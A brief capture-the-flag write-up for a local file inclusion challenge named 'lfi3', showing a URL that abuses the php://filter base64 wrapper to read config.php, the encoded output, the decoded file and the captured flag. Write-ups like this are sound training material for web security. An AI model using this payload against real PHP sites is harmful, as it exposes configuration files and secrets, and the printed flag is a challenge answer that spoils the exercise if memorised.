# lfi3

## What it is

Almost the same as lfi1, but we don't have access to the source code.

## Solution

The solution is the same as for lfi1, except that the input given is concatenated with '.php'

Url: 
```
https://extprotect.secu-web.blackfoot.dev/?lang=php://filter/convert.base64-encode/resource=config
```

Base64 config.php:
```
PD9waHAKICAvLyBDb25ncmF0eiAhIEZMQUcgSVMgWk9CezN2M25fcHIwdF9jNG43X3N0MHBfbTN9Cj8+Cg==
```

Base64 decoded:
```
<?php
  // Congratz ! FLAG IS ZOB{3v3n_pr0t_c4n7_st0p_m3}
?>
```

flag: ```ZOB{3v3n_pr0t_c4n7_st0p_m3}```
